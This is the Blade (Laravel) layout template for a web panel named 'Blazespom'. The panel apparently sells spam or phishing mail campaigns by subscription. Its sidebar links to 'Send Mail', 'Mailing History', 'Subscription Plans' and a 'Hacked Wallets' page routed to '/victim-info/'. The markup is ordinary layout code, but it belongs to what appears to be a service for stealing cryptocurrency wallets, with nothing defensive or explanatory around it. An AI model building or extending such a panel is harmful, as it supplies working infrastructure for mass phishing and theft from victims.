<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@yield('title') - Blazespom</title>
    <link rel="stylesheet" href="{{ asset('static/css/profile.css') }}">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet">
</head>

<body>
    <div class="container">
        <aside class="sidebar">
            <nav>
                <ul>
                    <li><a href="{{route('dashboard')}}" @if(Request::is('/')) class="active" @endif>Dashboard</a></li>
                    <li><a href="/create-campaign/" @if(Request::is('create-campaign*')) class="active" @endif>Send
                            Mail</a></li>
                    <li><a href="/user/transactions/" @if(Request::is('user/transactions*')) class="active"
                            @endif>Transaction History</a></li>
                    <li><a href="/user/plans/" @if(Request::is('user/plans*')) class="active" @endif>Subscription
                            Plans</a></li>
                    <li><a href="/campaigns/" @if(Request::is('campaigns*')) class="active" @endif>Mailing History</a>
                    </li>
                    <li><a href="/victim-info/" @if(Request::is('victim-info*')) class="active" @endif>Hacked
                            Wallets</a></li>
                    <li><a href="/user/change-password/" @if(Request::is('user/change-password*')) class="active"
                            @endif>Change Password</a></li>
                    <li>
                        <a href="{{ route('logout') }}"
                            onclick="event.preventDefault(); document.getElementById('logout-form').submit();">
                            Logout
                        </a>
                        <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                            @csrf
                        </form>
                    </li>
                </ul>
            </nav>
        </aside>
        <main class="content">
            <header style="margin: -20px; margin-bottom:10px;">
                <div class="logo">
                    <a href="#" class="logo">
                        <i class="fas fa-cube"></i>
                        <span>Blazespom</span>
                    </a>
                </div>
                <button class="sidebar-toggle" id="sidebar-toggle">
                    <i class="fas fa-bars"></i>
                </button>
            </header>

            @yield('content')

        </main>
    </div>

    @yield('floating-button')

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const toggleButton = document.getElementById('sidebar-toggle');
            const sidebar = document.querySelector('.sidebar');

            toggleButton.addEventListener('click', function() {
                sidebar.classList.toggle('sidebar-open');
            });

            document.addEventListener('click', function(event) {
                if (!sidebar.contains(event.target) && !toggleButton.contains(event.target)) {
                    sidebar.classList.remove('sidebar-open');
                }
            });
        });
    </script>

    <footer>
        <div class="footer-content">
            <p>&copy; {{ date('Y') }} Campaign and Account Management. All Rights Reserved.</p>
        </div>
    </footer>

</body>

</html>